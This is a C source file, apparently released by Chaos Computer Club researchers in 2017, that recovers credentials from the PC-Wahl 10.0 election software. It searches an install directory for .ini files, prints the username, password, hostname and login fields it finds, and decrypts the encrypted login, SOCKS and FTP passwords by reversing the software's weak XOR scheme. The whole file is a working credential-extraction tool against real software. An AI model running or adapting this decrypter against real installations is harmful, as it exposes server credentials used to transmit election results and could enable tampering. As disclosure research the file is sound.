//
// PC-Wahl 10.0 INI-Passwort Decrypter (c) 2017 
// by xonox & Thorsten (THS) Schroeder <ths [at] ccc [dot] de>
//

/*
   BSD 3-Clause License

   Copyright (c) 2017, Chaos Computer Club
   Author: xonox
   Author: Thorsten (THS) Schroeder <ths [at] ccc [dot] de>
   All rights reserved.

   Redistribution and use in source and binary forms, with or without
   modification, are permitted provided that the following conditions are met:

   * Redistributions of source code must retain the above copyright notice, this
     list of conditions and the following disclaimer.

   * Redistributions in binary form must reproduce the above copyright notice,
     this list of conditions and the following disclaimer in the documentation
     and/or other materials provided with the distribution.

   * Neither the name of the copyright holder nor the names of its
     contributors may be used to endorse or promote products derived from
     this software without specific prior written permission.

   * NON-MILITARY-USAGE CLAUSE
     Redistribution and use in source and binary form for military use and
     military research is not permitted. Infringement of these clauses may
     result in publishing the source code of the utilizing applications and
     libraries to the public. As this software is developed, tested and
     reviewed by *international* volunteers, this clause shall not be refused
     due to the matter of *national* security concerns.
    
   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
   AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
   IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
   DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
   FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
   DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
   SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
   CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
   OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include <windows.h>
#include <Strsafe.h>
#include <Shlwapi.h>
#include <stdio.h>

#include "helper.h"
#include "iniparser.h"

#define DEBUG 1

#define MAX_INIFILES   128
#define MAXLINE        1024

static char g_pcw_ini_files[MAX_INIFILES][_MAX_PATH];
static int g_count;

// We are looking for keys in wahlkreis sections: 
// hostname, userid, serverpfad, email, login (enc), sockslogin (enc), ftpp (enc)

char *ini_keys[] = {
   ":scripturl",
   ":directory",
   ":username",
   ":password",
   ":hostname",
   ":userid",
   ":serverpfad",
   ":email",
   ":login",
   ":sockslogin",
   ":ftpp",
   NULL
};

char *ini_keys_encrypted[] = {
   ":login",
   ":sockslogin",
   ":ftpp",
   NULL
};

static short GetCurrentColor()
{
   CONSOLE_SCREEN_BUFFER_INFO info;
   if (!GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &info))
      return 7;
   return info.wAttributes;
}

int pcwahl_find_files_by_extension(char *base_dir, char *extension)
{
   HANDLE hfind = INVALID_HANDLE_VALUE;
   WIN32_FIND_DATA ffd;
   char ff_dir[_MAX_PATH];
   
   ZeroMemory( &ff_dir, sizeof(ff_dir) );
   
   StringCchCopyA(ff_dir, _MAX_PATH, base_dir);
   PathAppendA(ff_dir, "*");
         
   hfind = FindFirstFile(ff_dir, &ffd);
   
   if (INVALID_HANDLE_VALUE == hfind) {
      if(DEBUG) printf("[e] [%d] find files in %s failed: %x\n", g_count, ff_dir, GetLastError());
      return -1;
   }

   do {
      if( ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY 
            && strcmp(ffd.cFileName, ".") != 0 
            && strcmp(ffd.cFileName, "..") != 0 ) {
               
         char tmppath[_MAX_PATH];
         
         StringCchPrintf(
               tmppath,
               _MAX_PATH,
               "%s\\%s",
               base_dir, ffd.cFileName);
             
         pcwahl_find_files_by_extension(tmppath, extension);
         
      } else {
         char *ext = PathFindExtensionA(ffd.cFileName);
         
         if(strcmp(ext, extension) == 0) {
         
            char tmppath[_MAX_PATH];
            
            StringCchPrintf(
                  tmppath,
                  _MAX_PATH,
                  "%s\\%s",
                  base_dir, ffd.cFileName);
            
            StringCchCopyA(g_pcw_ini_files[g_count], _MAX_PATH, tmppath);
            g_count++;
         }
      }
   } while (FindNextFileA(hfind, &ffd) != 0);
   
   return g_count;
}

int pcwahl_ini_decrypt_data(char *result, size_t resultsize, char *ciphertext)
{
   size_t clen = strlen(ciphertext);
   unsigned int i = 0;
   unsigned int j = 0;
   char octet[4];
   char key = 0;
   int pwlen = 0;
   char b = 0;
   
   if(result == NULL || ciphertext == NULL) {
      printf("[!] result == NULL || ciphertext == NULL\n");
      return -1;
   }
      
   if( clen == 0 || !(0 == clen % 3) ) {
      printf("[!] illegal ciphertext input len (%d)\n", clen);
      return -1;
   }
   
   if(resultsize < (clen/3) + 1) {
      printf("[!] resultbuffer too small (%d)\n", resultsize);
      return -1;
   }
   
   ZeroMemory(&octet, sizeof(octet));
   ZeroMemory(result, sizeof(result));
   
   for(i=0; i<clen; i+=3) {
      
      octet[0] = ciphertext[i+0];
      octet[1] = ciphertext[i+1];
      octet[2] = ciphertext[i+2];
      octet[3] = 0;
      
      j = i / 3;
      
      if(j % 2)
         key = (0xBF-j) & 0xFF;
      else
         key = (0xF0-j) & 0xFF;
      
      b = key ^ atoi(octet) & 0xFF;
      
      if(j == 0)
         pwlen = (unsigned int)b & 0xFF;
      else if(j-1 < pwlen) 
         result[j-1] = b;
      else 
         return pwlen;
   }
   
   return pwlen;
}

void pcwahl_ini_parse(char *path)
{
   dictionary *ini = NULL;
   int i = 0;
   HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
   short currentColor = GetCurrentColor();
   
   ini = iniparser_load(path);

   for (i=0; i < ini->size; i++) {
      
      if (ini->key[i] == NULL)
         continue ;
         
      if (ini->val[i] != NULL) {
         int j = 0;
         
         for(j=0; ini_keys[j] != NULL; j++) {
            int k = 0;
            
            if(StrStrA(ini->key[i], ini_keys[j]) && *ini->val[i] != 0) {
               
               printf("[%s]=[", ini->key[i]);
               SetConsoleTextAttribute(hConsole, 14);
               printf("%s", ini->val[i]);
               SetConsoleTextAttribute(hConsole, currentColor);
               printf("]\n");
               
               for(k=0; ini_keys_encrypted[k] != NULL; k++) {
                  
                  if(StrStrA(ini->key[i], ini_keys_encrypted[k]) && *ini->val[i] != 0) {
                     
                     char  plaintext[1024] = {0};
                     int resultlen = 0;
                     resultlen = pcwahl_ini_decrypt_data(plaintext, sizeof(plaintext), ini->val[i]);
                     
                     printf("[%s]=[", ini->key[i]);
                     SetConsoleTextAttribute(hConsole, 78);
                     printf("%s", plaintext);
                     SetConsoleTextAttribute(hConsole, currentColor);
                     printf("] (DECRYPTED)\n");
                  }
               }
            }
         }
      } 
   }
    
   iniparser_freedict(ini);
   return;
}

int main(int ac, char** av)
{
   char  plaintext[1024] = {0};
   char *encrypted = NULL;
   int resultlen = 0;
   int i = 0;
   HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
   
   SetConsoleTextAttribute(hConsole, 7);
   
   if(ac<2) {
      printf("[!] usage: %s <pcwahl base dir>\n", av[0]);
      return 1;  
   }
   
   ZeroMemory( &g_pcw_ini_files, sizeof(g_pcw_ini_files) );
      
   printf("[*] Looking for ini files in: %s\n", av[1]);
   resultlen = pcwahl_find_files_by_extension(av[1], ".ini");
   
   printf("[+] Found %d ini-files:\n", resultlen);
   for(i=0; i<resultlen; i++) {
      printf("[-] %s\n", g_pcw_ini_files[i]);
      pcwahl_ini_parse(g_pcw_ini_files[i]);
   }
   return 0;
}

